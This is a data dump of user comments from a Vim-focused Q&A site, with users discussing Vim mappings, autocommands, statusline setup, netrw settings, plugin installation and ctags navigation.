  <row Id="13173" PostId="7909" Score="1" Text="@Shahbaz There's [pi-rho's PPA](https://launchpad.net/~pi-rho/+archive/ubuntu/dev) if you don't want to wait." CreationDate="2016-05-22T23:59:15.687" UserId="205" />
  <row Id="13174" PostId="7898" Score="1" Text="How about, since you can use read-only command, copy part of the output you want, and paste it in another buffer. I guess it doesn't make sense to try to delete output of the terminal inside the terminal mode. But it surely does to copy the output for later use." CreationDate="2016-05-23T06:47:16.920" UserId="1821" />
  <row Id="13175" PostId="7910" Score="3" Text="I wrote this answer: [How do I debug my mapping?](http://vi.stackexchange.com/q/7722/1841) which may be helpful, once you've tried what is stated there you could update your question to give us more details. It is probable that romainl is right and your terminal doesn't handle `&lt;c-space&gt;` properly." CreationDate="2016-05-23T07:15:27.187" UserId="1841" />
  <row Id="13176" PostId="3748" Score="0" Text="`fugitive` needs the path from the root of the repository.  The answer already cover this, but I wrongly assumed that fugitive could understand when we are in a particular subdirectory of the repo." CreationDate="2016-05-23T10:52:40.627" UserId="7518" />
  <row Id="13178" PostId="7913" Score="0" Text="According to http://www.vim.org/scripts/script.php?script_id=213, I am to copy the zip archive to $HOME/.vim/ and then unzip it there.  Is there a better place to unzip it?" CreationDate="2016-05-23T14:28:12.640" UserId="7707" />
  <row Id="13179" PostId="7913" Score="0" Text="@user3410845, If unzip extracts everything in a subdirectory, then you'll want to add this directory to your runtime path option (`:h 'rtp'`). If the plugin doesn't do/provide anything, then it's likely you either need to change your runtime path option, or to install the plugin directly in `~/.vim` without any intermediary directory -- this is not recommended. Otherwise you can also use a plugin manager which will make the installation almost transparent. (For instance, don't even try to use the alternative lh-cpp without any plugin manager)" CreationDate="2016-05-23T14:58:38.743" UserId="626" />
  <row Id="13180" PostId="7913" Score="0" Text="I deleted the plugin and then followed the procedure to copy the zip archive to `$HOME/.vim/` and then unzip it there once more, and now it seems to work fine.  I don't know why it didn't work before." CreationDate="2016-05-23T15:17:09.343" UserId="7707" />
  <row Id="13181" PostId="7892" Score="1" Text="Actually I put `set number` in my vimrc file, and that works fine in most of the modes. But it does not work in netrw. And yes when I type `:set nu` explicitly in netrw, the line numbers appear." CreationDate="2016-05-23T16:54:25.910" UserId="1080" />
  <row Id="13187" PostId="7915" Score="1" Text="Thanks! I had a feeling I was Doing It Wrong™. " CreationDate="2016-05-23T18:21:47.860" UserId="7702" />
  <row Id="13189" PostId="7918" Score="0" Text="You can use auto commands. Put :au BufEnter *.extension :set shiftwidth=4 in ~/.vimrc. it will work. Instead of .extension, type the exact extension of Erlang. (I don't know its extension) every time, when you open a Erlang file, it will automatically change shiftwidth to 4." CreationDate="2016-05-24T03:12:05.037" UserId="7161" />
  <row Id="13191" PostId="7918" Score="0" Text="Thank you for the workaround!" CreationDate="2016-05-24T03:34:21.167" UserId="7706" />
  <row Id="13192" PostId="7918" Score="0" Text="You can paste a link for your vimrc here (for debugging). Also, sometimes your command might be ovverriden by system defaults. In such case, you can put your plugin in after/ftplugin directory or use auto commands. It is difficult to find what causes this issue. You can add more information in your question :)" CreationDate="2016-05-24T03:57:54.043" UserId="7161" />
  <row Id="13193" PostId="7917" Score="1" Text="`mode()` returns a literal `Ctrl-V` for visual block mode and a literal `Ctrl-S` for select mode. You should write a custom function that cleans up the output of `mode()` instead of `mode()` directly." CreationDate="2016-05-24T05:19:07.527" UserId="54" />
  <row Id="13194" PostId="7917" Score="0" Text="This seems to solve the issue, if you want to make an answer, I'll accept it." CreationDate="2016-05-24T06:34:57.923" UserId="1821" />
  <row Id="13196" PostId="7918" Score="0" Text="@toraritte In the buffer where the level of indentation is wrong, if you type `:verb setl ts sts sw et?`, what is the output ?" CreationDate="2016-05-24T09:13:20.337" UserId="6960" />
  <row Id="13198" PostId="7921" Score="0" Text="Does your new syntax of the `SubName` function changes anything ? I tried it but it does not change much (except the size of my statusline zone).     &#xA;Taking off the test around `set statusline` did the trick, thanks, but now I have a little empty zone with the `%8` color in my statusline when opening a non-fortran file. It would be even better if I could get rid of it." CreationDate="2016-05-24T09:53:51.510" UserId="7128" />
  <row Id="13199" PostId="7921" Score="0" Text="@Feffe No it doesn't change anything, it's just shorter. The only difference is a space before and after the name of the subroutine inside the function, because I saw there were two spaces inside your code to separate the name from the rest of the information. I don't have a little empty zone with the `%8` color in my statusline when opening a non-fortran file. I'm sorry but I don't understand why you have this zone. It shouldn't be there if you move the spaces inside the function, where the test is realised. Could you give me a link of your complete statusline configuration?" CreationDate="2016-05-24T10:05:32.920" UserId="6960" />
  <row Id="13200" PostId="7922" Score="0" Text="If the intention is to create new line after some character for selected lines, we can try a macro. Go to nth column and enter a new line and repeat it till the selection" CreationDate="2016-05-24T10:15:51.340" UserId="7161" />
  <row Id="13201" PostId="7922" Score="0" Text="Yes, or a substitution could also work, but my intention is to work out the way to do within visual block mode." CreationDate="2016-05-24T10:17:30.257" UserId="1821" />
  <row Id="13202" PostId="7921" Score="0" Text="I added it to my question, tell me if you'd rather have a text file." CreationDate="2016-05-24T10:19:34.733" UserId="7128" />
  <row Id="13203" PostId="7921" Score="0" Text="I should have copied your version of the `set statusline`. Thank you for your patience and explanations." CreationDate="2016-05-24T10:23:08.110" UserId="7128" />
  <row Id="13205" PostId="6176" Score="0" Text="Your java file's name is test.java but class name is Test. Remember, Java is case sensitive. You have to rename the file to Test.java and try again. Main Class name and filename should be of samename. After correcting it, It should work." CreationDate="2016-05-24T10:39:39.817" UserId="7161" />
  <row Id="13206" PostId="4144" Score="0" Text="I am using windows. I downloaded cygwin and used vim inside it. It supports complex characters like indic characters. You can type them But the problem is diacritics arent shown. They either hide the main character or they themselves hidden. I couldn't find a solution for this yet." CreationDate="2016-05-24T11:53:39.330" UserId="7161" />
  <row Id="13207" PostId="5117" Score="0" Text="Give :set autoindent before trying macro. It works for me." CreationDate="2016-05-24T12:24:44.883" UserId="7161" />
  <row Id="13208" PostId="5117" Score="0" Text="Give :set autoindent before trying macro. It works for me." CreationDate="2016-05-24T12:26:31.540" UserId="7161" />
  <row Id="13209" PostId="7918" Score="0" Text="@user9433424, SibiCoder I'll make a gist with all my configs and requested output once I'm off work. Thank you for looking into this." CreationDate="2016-05-24T15:18:26.300" UserId="7706" />
  <row Id="13210" PostId="7922" Score="4" Text="This can't be done in visual block mode, unfortunately. Use a substitution or a recording instead." CreationDate="2016-05-24T15:30:06.913" UserId="54" />
  <row Id="13212" PostId="7926" Score="1" Text="That's not the answer I wanted!  I've changed my trail char to `~` which is a little less confusing (might also look for some obscure unicode char to use)." CreationDate="2016-05-24T17:03:18.813" UserId="4913" />
  <row Id="13213" PostId="7927" Score="0" Text="Alas this doesn't work well with C++ functions. Unlike C functions, they are likely to be indented (it's the case with inline members functions defined in their class definition, and with the default indentation of functions within namespaces). However your idea can be built upon thanks to function definition range that can be obtained with ctags. I do it in the function [`lh#dev#find_function_boundaries`](https://github.com/LucHermitte/lh-dev/blob/master/autoload/lh/dev.vim#L64) from lh-dev" CreationDate="2016-05-24T17:49:01.360" UserId="626" />
  <row Id="13214" PostId="7927" Score="3" Text="Nice approach. If you can reliably find the top line of the function, then you can move to the `{` and then use `%` to reach the bottom line. Not sure how you might find the function start in C++, but this works ok for Javascript: `vnoremap if &lt;Esc&gt;?^\s*function&lt;CR&gt;v/{&lt;CR&gt;%o`" CreationDate="2016-05-24T19:56:23.737" UserId="630" />
  <row Id="13215" PostId="7924" Score="2" Text="I only [highlight the cursor line briefly](https://github.com/joeytwiddle/rc_files/blob/b7c7df4fa395d53b6908ed6dbec9a3ea3d1a204b/.vim/plugin/highlight_line_after_jump.vim) after I have jumped 2 or more lines. When I am editing text, the cursorline is off. If you can get used to that behaviour, it could mitigate your problem." CreationDate="2016-05-24T20:08:15.623" UserId="630" />
  <row Id="13216" PostId="7928" Score="1" Text="`copy and paste text from elsewhere` Do you mean elsewhere in vim, e.g. in the same file, or elsewhere as in from your browser?" CreationDate="2016-05-24T21:20:06.110" UserId="2920" />
  <row Id="13217" PostId="7928" Score="1" Text="Elsewhere in the same buffer. For example, often I will have certain long variable names or constant names that are used repeatedly. In a notepad-like editor, I double click on the variable and ctrl-C ctrl-V to paste it. I am kind of looking to translate this workflow to vim." CreationDate="2016-05-24T21:24:54.357" UserId="6952" />
  <row Id="13218" PostId="7931" Score="0" Text="I don't want to use it with the mouse. I want to use vim like vim. I just need to know what the workflow is for cobbling together a text that has lots of redundant words in it." CreationDate="2016-05-24T21:36:20.340" UserId="6952" />
  <row Id="13219" PostId="7931" Score="0" Text="Oh, in that case definitely disregard my advice. `:P` In that case, I would just use `&lt;C-p&gt;` like [cbaumhardt recommended.](http://vi.stackexchange.com/a/7930/2920)" CreationDate="2016-05-24T21:39:40.160" UserId="2920" />
  <row Id="13221" PostId="7938" Score="0" Text="nice explanation, thanks. the ascii literal sounds nice as it might be something a bit more non-vim specific. what would be an example of an ascii literal?" CreationDate="2016-05-25T05:04:52.500" UserId="4603" />
  <row Id="13222" PostId="7938" Score="1" Text="@the_velour_fog No, using `&lt;C-v&gt;` is vim specific. It's just how vim handles keys with modifiers. There's also `&lt;M-v&gt;` (meta + v, usually alt) and `&lt;S-v&gt;` (shift + v). In other languages, it would probably be a hex code corresponding to the [ascii table](http://www.asciitable.com/), although it varies from language to language." CreationDate="2016-05-25T05:08:11.883" UserId="2920" />
  <row Id="13223" PostId="7934" Score="3" Text="Are you sure you don't have `nano` on your system?" CreationDate="2016-05-25T05:13:17.560" UserId="54" />
  <row Id="13224" PostId="7938" Score="0" Text="interesting, I just entered the `^E` digraph character into a file using vim, then opened the file with `hexedit`. the character in hex is `05` , from the [ascii table](http://www.asciitable.com/) it is called `ENQ` where [this explains that ENQ is an old way of referencing `Ctrl-e`](https://answers.yahoo.com/question/index?qid=20090429210551AAfL2z9)" CreationDate="2016-05-25T05:24:23.260" UserId="4603" />
  <row Id="13225" PostId="7938" Score="1" Text="If you find that interesting, you'd also find it interesting that ctrl+ `a, b, c, ...` is `01, 02, 03, 04 ...`. Also, if you take any valid key and do it again but with `alt` down, it adds 128 (hex 80) to the ASCII value." CreationDate="2016-05-25T05:30:02.737" UserId="2920" />
  <row Id="13227" PostId="7938" Score="0" Text="nice, with `Ctrl + a,b,c` (I need to hit C-b twice because Im running tmux) I get that result. But if I open a file in vim as UTF-8 and press `Ctrl-v`,then `alt + a` I get two characters. in vim it looks like `^[` and then a normal `a`. In hexedit its `1B` and `61` . from ascii table, `ESC` and letter `a`, weird..." CreationDate="2016-05-25T05:45:14.160" UserId="4603" />
  <row Id="13228" PostId="7932" Score="0" Text="It seems that it is a predefined functionality. By the image you have posted, I guess square brackets serves like cursor and when you move across, [* ] shows that your cursor is in that file. Does it causes any issue for you?" CreationDate="2016-05-25T05:49:00.317" UserId="7161" />
  <row Id="13229" PostId="7936" Score="1" Text="`:help key-notation`" CreationDate="2016-05-25T08:16:38.837" UserId="54" />
  <row Id="13230" PostId="7936" Score="0" Text="@romainl  I was looking for that exact section in the documentation when I asked the question. I remember seeing it but couldn't remember how to get to it!" CreationDate="2016-05-25T08:25:15.950" UserId="4603" />
  <row Id="13231" PostId="7936" Score="0" Text="I knew it had `ctrl-k` but when I tried `:helpgrep ctrl-k` I got nothing. Helpgrep is case sensitive so I should have used `:helpgrep ctrl-k\c`" CreationDate="2016-05-25T08:45:32.503" UserId="4603" />
  <row Id="13232" PostId="7927" Score="1" Text="Regarding your last edit. `CTRL-]` jumps to the tag under the cursor. Not to the start of the current function. It won't help." CreationDate="2016-05-25T09:16:21.850" UserId="626" />
  <row Id="13233" PostId="7945" Score="0" Text="Thank you for your answer. However it does not do what I want, cause I used the wrong term in my problem description (sorry for that). I want the mapping to jump to the next *Link* to an identifier, so I can then press `&lt;C-]&gt;`. So it would be nice if you could update the solution to use `|` instead of `*` :-)" CreationDate="2016-05-25T12:19:03.360" UserId="3282" />
  <row Id="13234" PostId="7945" Score="0" Text="Does my update is what you were looking for? :-)" CreationDate="2016-05-25T12:26:48.060" UserId="1841" />
  <row Id="13235" PostId="7945" Score="0" Text="At the moment not yet: If I open help files, e.g. `:h help` and press `]i`, then the cursor doesn't move (I expect it to jump to the blue underlined word `help-translated`)." CreationDate="2016-05-25T12:32:09.560" UserId="3282" />
  <row Id="13237" PostId="7945" Score="0" Text="Yup because of the escaping of `|` let me work on that" CreationDate="2016-05-25T12:49:03.353" UserId="1841" />
  <row Id="13238" PostId="7945" Score="3" Text="`\W` is the wrong atom to use in this case, since it matches all non-word characters.  Use `.` instead.  Also, using a greedy multi like `*` means no more than one match will be found for each line.  Use `{-}` instead.  Put together: `'\v\|.{-}\|'`.  The reason for `\v` is that patterns can be interpreted differently depending on the `magic` option, and `\v` explicitly sets it to &quot;very magic&quot;." CreationDate="2016-05-25T12:50:06.547" UserId="865" />
  <row Id="13239" PostId="7945" Score="0" Text="@EvergreenTree: Yup good suggestions thanks." CreationDate="2016-05-25T12:56:53.410" UserId="1841" />
  <row Id="13241" PostId="7945" Score="0" Text="See the edit with the solution suggested by evergreenTree, it works fine for me." CreationDate="2016-05-25T13:01:23.993" UserId="1841" />
  <row Id="13242" PostId="7945" Score="0" Text="Perfect, it works now :) Thanks statox and EvergreenTree!" CreationDate="2016-05-25T13:01:38.703" UserId="3282" />
  <row Id="13243" PostId="7947" Score="1" Text="Probably, this can be asked as a feature in newer versions!" CreationDate="2016-05-25T13:21:52.750" UserId="7161" />
  <row Id="13244" PostId="7947" Score="3" Text="Related : http://vi.stackexchange.com/questions/570/can-i-see-the-history-of-key-presses-in-normal-mode" CreationDate="2016-05-25T13:39:38.727" UserId="7161" />
  <row Id="13245" PostId="7947" Score="4" Text="AFAIK not possible - but, since these sequences are short, I'm not sure what gain would such a feature accomplish. When you have to retry the whole sequence, at least you are &quot;forced&quot; to repeat it until you make no such mistakes ;) (i.e. - repeating builds character! pun intended)." CreationDate="2016-05-25T13:46:21.867" UserId="1800" />
  <row Id="13246" PostId="7947" Score="1" Text="@VanLaser A Vimmer's worst nightmare is being &quot;forced&quot; to repeat something ;)&#xA;&#xA;Also, I suck at typing and have a [blank keyboard](http://www.daskeyboard.com/daskeyboard-4-ultimate/) so it's not uncommon for me to mess up a command 256 times before getting it right." CreationDate="2016-05-25T13:50:12.723" UserId="7749" />
  <row Id="13247" PostId="7947" Score="0" Text="I am afraid since no such feature can exist. Each key is taken literally as a part of an operation. In normal mode, backspace corresponds to `h`( moves backwards). So, 19`BS` might move 19characters backwards. Or, the command might become invalid if not expected key is pressed." CreationDate="2016-05-25T14:06:45.660" UserId="7161" />
  <row Id="13248" PostId="7945" Score="1" Text="Also note that you can create a backwards searching version by passing `'b'` as an argument to `search()`." CreationDate="2016-05-25T14:13:53.303" UserId="865" />
  <row Id="13249" PostId="7947" Score="0" Text="@DC_ So, your real problem is elsewhere :)" CreationDate="2016-05-25T14:22:30.460" UserId="1800" />
  <row Id="13250" PostId="7947" Score="4" Text="What could go wrong when a bad typist uses a blank keyboard?" CreationDate="2016-05-25T14:39:26.007" UserId="54" />
  <row Id="13251" PostId="7949" Score="4" Text="The idea of remapping `&lt;Space&gt;` seems pretty interesting since it reduces the number of invocations of the functions. I'll try to work in this way too!" CreationDate="2016-05-25T15:02:45.720" UserId="1841" />
  <row Id="13252" PostId="7950" Score="1" Text="Now that's an elegant solution! According to my first tests it works well. I'll have to use it for some time to be sure it is robust. I like how you modified `v:char` that the idea I was missing on my first try." CreationDate="2016-05-25T15:18:11.453" UserId="1841" />
  <row Id="13256" PostId="7932" Score="2" Text="Gotcha. Your question made it seem as if you have no idea how the icons got there. You should contact the authors of vim-devicons if you don't want these brackets to be there, as it seems to be the [default behavior](https://github.com/ryanoasis/vim-devicons) (see screenshot)" CreationDate="2016-05-25T16:00:13.123" UserId="4947" />
  <row Id="13257" PostId="7946" Score="0" Text="I have changed the keybind LHS to suit you." CreationDate="2016-05-25T16:49:41.703" UserId="630" />
  <row Id="13258" PostId="7946" Score="0" Text="Your solution works great, too :) I must have messed something up when pasting your code in my `.vimrc` and having changed the `&lt;Tab&gt;` to `]i`, because I tried your code then and it didn't work for me. It does work now and you didn't change anything other than the mapped keys, so I messed that up before. You deserve credit here too :)" CreationDate="2016-05-25T18:05:38.593" UserId="3282" />
  <row Id="13259" PostId="7959" Score="1" Text="`in the same editing session`. Are these files still open in another tab or buffer?" CreationDate="2016-05-25T18:38:03.657" UserId="2920" />
  <row Id="13260" PostId="7959" Score="0" Text="@DJMcMayhem Highly probable." CreationDate="2016-05-25T18:40:10.450" UserId="6634" />
  <row Id="13261" PostId="7956" Score="0" Text="Thanks a lot, that did the job. I have removed the lF9 and created an additional normal mode command.&#xA;`inoremap &lt;LocalLeader&gt;si \SI{&lt;Esc&gt;Ea}{&lt;Del&gt;&lt;Esc&gt;Ea}`&#xA;`noremap &lt;LocalLeader&gt;si bi\SI{&lt;Esc&gt;Ea}{&lt;Del&gt;&lt;Esc&gt;Ea} &lt;Esc&gt;`" CreationDate="2016-05-25T18:44:33.407" UserId="979" />
  <row Id="13262" PostId="7956" Score="0" Text="woops, that was supposed to be `noremap`. Not sure how I missed that, I did test it. :P Glad it worked for you. The IF9 should make it work with your cursor on any point of your original value." CreationDate="2016-05-25T19:02:56.580" UserId="6489" />
  <row Id="13263" PostId="7953" Score="0" Text="Note that you can just do `4l` instead of `llll`" CreationDate="2016-05-25T21:40:57.120" UserId="865" />
  <row Id="13264" PostId="7953" Score="0" Text="@EvergreenTree - Updated." CreationDate="2016-05-25T21:58:33.770" UserId="2172" />
  <row Id="13265" PostId="7959" Score="0" Text="I don't use python, but - since you want to remove *all* breakpoints, doesn't `pdb` have a command that does just that? I.e. without the need to specify any file. Something like `pdb.clear`, say (if such command exists)." CreationDate="2016-05-25T21:59:01.583" UserId="1800" />
  <row Id="13266" PostId="7959" Score="0" Text="I would probably end up using a global list that tracked all the files that had been edited. i.e. `autocmd BufWritePost * add(g:edditedFiles, expand('%:p')` and then use a for loop over that list whenever I wanted to do the &quot;global&quot; edit." CreationDate="2016-05-25T22:02:48.647" UserId="6489" />
  <row Id="13267" PostId="7958" Score="2" Text="Visual selection + `gx` works for me (a line containing `~/foo bar.txt`, with visual selection from `~` to the final `t`, as opposed to a selection to the end of line, pressing `gx` opens gvim with the appropriate file)." CreationDate="2016-05-26T00:01:00.707" UserId="205" />
  <row Id="13268" PostId="7957" Score="0" Text="If you did solve your problem, do consider posting an answer instead of deleting the question." CreationDate="2016-05-26T00:02:13.337" UserId="205" />
  <row Id="13269" PostId="7892" Score="0" Text="@user3813057 `netrw`'s filetype settings might unset `number`" CreationDate="2016-05-26T00:02:55.530" UserId="205" />
  <row Id="13270" PostId="7958" Score="0" Text="@muru: Hm, `gx` does not work for me when I am in visual mode, I just tried your example with a text file. `gf` on the other hand does work. When I press `gx` in visual mode, I get the usual error sound GNOME produces when an operation fails. Any ideas what might cause this behaviour? Perhaps I have to go through my list of plugins..." CreationDate="2016-05-26T00:22:37.353" UserId="3282" />
  <row Id="13271" PostId="7962" Score="1" Text="And your other recently-deleted question about `matchadd` is also an instance of the same quoting problem." CreationDate="2016-05-26T00:59:22.870" UserId="205" />
  <row Id="13272" PostId="7892" Score="0" Text="Thanks a lot for your detailed answer. I'll wait for another couple of days, and accept your answer if there is no better one." CreationDate="2016-05-26T01:57:42.623" UserId="1080" />
  <row Id="13273" PostId="7892" Score="0" Text="@muru what do you mean by &quot;unset `number`&quot;? the only command in my .vimrc file related to netrw is the `let` command in the original post. And what do you mean by `filetype`? the comment command in a source code like `// vim: filetype=java` and/or `% vim: filetype=tex`?" CreationDate="2016-05-26T02:04:31.050" UserId="1080" />
  <row Id="13274" PostId="7958" Score="0" Text="If you cant open filename with spaces, You can escape spaces in filename by typing \ before each space" CreationDate="2016-05-26T02:09:47.913" UserId="7161" />
  <row Id="13275" PostId="7892" Score="0" Text="1. `set nonumber`. 2. See [`:h ftplugin`](http://vimhelp.appspot.com/usr_41.txt.html#ftplugin). 3. Try `:verbose set number?`. You'll probably see `/usr/share/vim/vim74/autoload/netrw.vim`." CreationDate="2016-05-26T02:11:06.960" UserId="205" />
  <row Id="13278" PostId="7961" Score="0" Text="//not recognized as an internal or external command// When I run start cmd in gvim, i am not getting this error. `Start cmd` starts a cmd prompt. When I enter the command you specified, %:p is expanded as current filename and then command is executed." CreationDate="2016-05-26T03:56:47.663" UserId="7161" />
  <row Id="13279" PostId="7961" Score="0" Text="Please include that in $PATH. You can also set it in .vimrc file like :set path+=/blah/blah/blah. After including, try once again." CreationDate="2016-05-26T04:00:28.040" UserId="7161" />
  <row Id="13283" PostId="7966" Score="2" Text="http://askubuntu.com/questions/225004/using-vim-as-external-editor-using-only-one-instance, http://vi.stackexchange.com/q/5354/205" CreationDate="2016-05-26T10:30:02.070" UserId="205" />
  <row Id="13284" PostId="7966" Score="2" Text="I'm inclined to close this as too broad." CreationDate="2016-05-26T10:30:12.353" UserId="205" />
  <row Id="13285" PostId="7966" Score="2" Text="I would understand the closing as too broad. SE maybe isn't the most adapted platform to this question but I feel like I'm missing something about this feature so I thought other could benefit of these answers." CreationDate="2016-05-26T10:42:55.347" UserId="1841" />
  <row Id="13286" PostId="7968" Score="0" Text="That's a use case I hadn't envisaged but indeed if you don't like to navigate through your files from Vim that can be a good workaround." CreationDate="2016-05-26T11:59:57.220" UserId="1841" />
  <row Id="13287" PostId="7967" Score="0" Text="So it is useful not to be used by the user directly but by third party application. Thanks for your answer that is pretty interesting." CreationDate="2016-05-26T12:01:54.500" UserId="1841" />
  <row Id="13288" PostId="7968" Score="0" Text="Well, I wouldn't consider it a &quot;work around&quot; since the other thing I'm doing, minimally, with the file browser at the same time is glancing at files in the same locations (for text via `less`, which is instantaneous and one key to exit) and possibly sending them to applications other than vim that also have a remote mode like this (many things do now, including other &quot;editors&quot; which I sometimes use to leave stacked tabs of headers for viewing, and also web browsers).  Put another way, I'd say navigating the fs with vim seems like a work around for not using `mc` and `--remote`, ;)" CreationDate="2016-05-26T12:10:51.100" UserId="4913" />
  <row Id="13289" PostId="7968" Score="1" Text="Yup that's a workflow in itself and not a workaround, my phrasing wasn't ideal but I understood the idea of your answer ;-)" CreationDate="2016-05-26T12:13:11.140" UserId="1841" />
  <row Id="13290" PostId="7967" Score="2" Text="@statox Yes. That's the main use cases I see: simple integration with external tools. Simple because we can feed vim commands and functions  through the command line." CreationDate="2016-05-26T13:16:38.773" UserId="626" />
  <row Id="13291" PostId="7967" Score="1" Text="Eclim is another example of this." CreationDate="2016-05-26T14:27:40.360" UserId="4913" />
  <row Id="13293" PostId="7927" Score="0" Text="Regarding the new edit. It ain't that simple. The difficulty is to have vim know the current function. If it had the information, it wouldn't require ctags help. The only way to obtain the information (from ctags) is to analyse the _jump-to-declaration_ commands produced by ctags. If these commands were `:linenumber`, vim could do what I do in my plugin. But there is no guarantee, and these commands can instead be search-`/pattern`s -- Vim cannot test all patterns to know which one matches the current function.IOW, I'm not aware of any vim action to jump to the start of the current function" CreationDate="2016-05-26T15:54:48.433" UserId="626" />
  <row Id="13294" PostId="7970" Score="1" Text="Setting `let $MYVIMRC=&quot;/home/username/dotfiles/.vimrc&quot;` in my `.vimrc` works as long as I don't open the symlinks. I am surprised that I could just set it like a normal variable, given its unusual variable name. Embarassing... Thanks :-)" CreationDate="2016-05-26T16:01:08.537" UserId="3282" />
  <row Id="13295" PostId="7933" Score="0" Text="This just selects the next block it can find. It doesn't work at all once you add `if`, `for`, `while`, etc." CreationDate="2016-05-26T16:17:26.907" UserId="2920" />
  <row Id="13296" PostId="7957" Score="0" Text="Sorry, I don't have much time for a serious answer. However, I have many  functions that generate mappings, restore/remove mappings (see `lh#on#exit()`), and so on. For instance, you could have a look at [`lh#menu#map_all()`](https://github.com/LucHermitte/lh-vim-lib/blob/master/autoload/lh/menu.vim#L565) and its test case, or lh-bracket [`s:DefineMap()`](https://github.com/LucHermitte/lh-brackets/blob/master/autoload/lh/brackets.vim#L329)." CreationDate="2016-05-26T17:19:26.687" UserId="626" />
  <row Id="13297" PostId="7959" Score="0" Text="@Tumbler41 good idea, haven't thought of that, because I'm not really familiar with vimscript." CreationDate="2016-05-26T17:19:59.960" UserId="6634" />
  <row Id="13298" PostId="7957" Score="0" Text="As a side note, your need is quite odd. While I often need modal mappings (that are just defined for the duration of some specific tasks), I don't see a use case where a window mapping could make sense. The task won't be simple as you'll need to restore buffer mappings that you've overridden for the current window." CreationDate="2016-05-26T17:22:13.987" UserId="626" />
  <row Id="13299" PostId="7961" Score="0" Text="@SibiCoder `:!start cmd` opens a command prompt, and it's the %path% in that command prompt that is missing ImageMagick. The path in vim is correct and is not reflected in the spawned cmd prompt.  Adding the path to ImageMagic to the vim $path didn't work." CreationDate="2016-05-26T18:13:43.253" UserId="7766" />
  <row Id="13300" PostId="5292" Score="1" Text="Thanks; I updated the final code block." CreationDate="2016-05-26T19:24:52.513" UserId="559" />
  <row Id="13301" PostId="7971" Score="0" Text="I will look into it and see if it helps" CreationDate="2016-05-26T20:25:12.587" UserId="7555" />
  <row Id="13302" PostId="7961" Score="0" Text="Can you add the output of echo $PATH and %path% here?" CreationDate="2016-05-27T03:37:51.020" UserId="7161" />
  <row Id="13303" PostId="7956" Score="0" Text="lF9 does not work for me, it would move the cursor left one char and then Find the 9 the occurence of the character to the left. That does not seem right. Would it not make more sense to use `rb` for the normal mode command?" CreationDate="2016-05-27T06:12:35.330" UserId="979" />
  <row Id="13305" PostId="7977" Score="1" Text="Thank you very much." CreationDate="2016-05-27T09:38:24.200" UserId="6946" />
  <row Id="13306" PostId="7981" Score="0" Text="AFAIK it is not possible, less is a pager not a text editor." CreationDate="2016-05-27T10:02:11.917" UserId="1841" />
  <row Id="13308" PostId="7981" Score="4" Text="Note sure if this helps you, but muru has some experience dealing with this and wrote a nice blog post here: https://www.cse.iitb.ac.in/~murukesh/2015/08/28/vim-for-man.html . Alternatively, you could look at something like https://github.com/rkitover/vimpager" CreationDate="2016-05-27T11:20:39.643" UserId="3282" />
  <row Id="13309" PostId="7981" Score="1" Text="Why do you even expect `less` to use your `vimrc`?" CreationDate="2016-05-27T11:59:03.703" UserId="54" />
  <row Id="13310" PostId="7956" Score="0" Text="That's odd. Use whatever you like I suppose, but `F9` in normal mode should look backwards for the first '9' character. The reason it moved the cursor one to the right was so that if your cursor was on 9 it would still find it. (I was assuming that the sequence would always start with a 9 as per your example, but maybe that isn't the case.) Not sure what you mean about `rb`. That should just replace the character under your cursor with the letter b...." CreationDate="2016-05-27T14:15:07.557" UserId="6489" />
  <row Id="13311" PostId="7959" Score="0" Text="Let us know what you end up with. Or if you need help implementing it, let me know and I can post an answer if you like." CreationDate="2016-05-27T14:48:47.370" UserId="6489" />
  <row Id="13312" PostId="7981" Score="0" Text="Are we talking about [this](http://lesscss.org/)? When talking about other tools/programs could you make sure we are all on the same page by posting a link?" CreationDate="2016-05-27T14:52:37.047" UserId="6489" />
  <row Id="13315" PostId="7956" Score="0" Text="Ah, now I get it. No, the 9.81 was just an example. The numbers are always different, as are the units. The rb was a typo, I meant lb (move right and then back to the beginning of the word). That way, the command works no matter if the cursor is on the first char or not." CreationDate="2016-05-27T16:09:05.037" UserId="979" />
  <row Id="13316" PostId="7956" Score="0" Text="Ok, yeah that makes sense. I'll update mine to be `lB` (Capital just in case there's a decimal point) ;)." CreationDate="2016-05-27T16:35:08.393" UserId="6489" />
  <row Id="13317" PostId="7959" Score="0" Text="@Tumbler41    ```autocmd! BufWritePost *.py add(g:edited_python_files, expand('%:p'))``` Now it says not an editor command on this line." CreationDate="2016-05-27T17:26:34.587" UserId="6634" />
  <row Id="13318" PostId="7959" Score="0" Text="Yeah, that was my bad, needs to be `autocmd! BufWritePost *.py call add(g:edited_python_files, expand('%:p'))`. `add()` is a function so you have to have a `call` in front of it." CreationDate="2016-05-27T17:57:15.237" UserId="6489" />
  <row Id="13319" PostId="2267" Score="0" Text="Cannot fully decouple scrolling. After having :set scrollopt=  (equal nothing) still move commands like 'm (jump to mark &quot;m&quot;) or gg are performed on both my two windows. It's ubuntu gvim after doing a :vertical split with no file specified" CreationDate="2016-05-27T18:09:48.080" UserId="5250" />
  <row Id="13320" PostId="2267" Score="0" Text="Apparently I solved the issue mentioned in the previous comment by setting :set nocursorbind in addition to :set scrollopt=  (nothing)" CreationDate="2016-05-27T18:29:13.767" UserId="5250" />
  <row Id="13322" PostId="2267" Score="0" Text="Not fully solved. Another option was left, :set nodiff. My vim was thinking that I was diffing two views of the same file. The nodiff option removed the all-dashes lines that vimdiff uses to sync both sides." CreationDate="2016-05-27T21:18:08.667" UserId="5250" />
  <row Id="13325" PostId="52" Score="0" Text="Why dont you add such settings in .vimrc for particular filetype? `:au BufEnter *.js :set shiftwidth=2`. This works for all projects," CreationDate="2016-05-28T08:38:39.127" UserId="7161" />
  <row Id="13326" PostId="146" Score="1" Text="Of Course, line numbers, %, marks can be prefixed with this command. Example :   :1,5norm i# (or) : 'a,'bnorm i# (or) :10%norm i#" CreationDate="2016-05-28T08:40:12.167" UserId="7161" />
  <row Id="13328" PostId="123" Score="1" Text="@howardh  : In vim, Ctrl+A and Ctrl+a mean the same and you can't bind them separately But Ctrl+A is shown in help Files." CreationDate="2016-05-28T08:51:30.783" UserId="7161" />
  <row Id="13329" PostId="4101" Score="0" Text="You have to add let @a=&quot;1&quot; in your answer. Beginners might get stuck up to find how to store value 1 in register a." CreationDate="2016-05-28T08:52:36.087" UserId="7161" />
  <row Id="13331" PostId="8015" Score="1" Text="1. The Tagbar plugin reads the output of ctags-like programs directly, *without using any pre-existing `tags` file*, and processes that data independently. Everything tags-related it does or doesn't is completely separated from anything tag-related Vim does or doesn't. **So… is your question about Vim or about Tagbar?**" CreationDate="2016-05-28T19:22:55.817" UserId="54" />
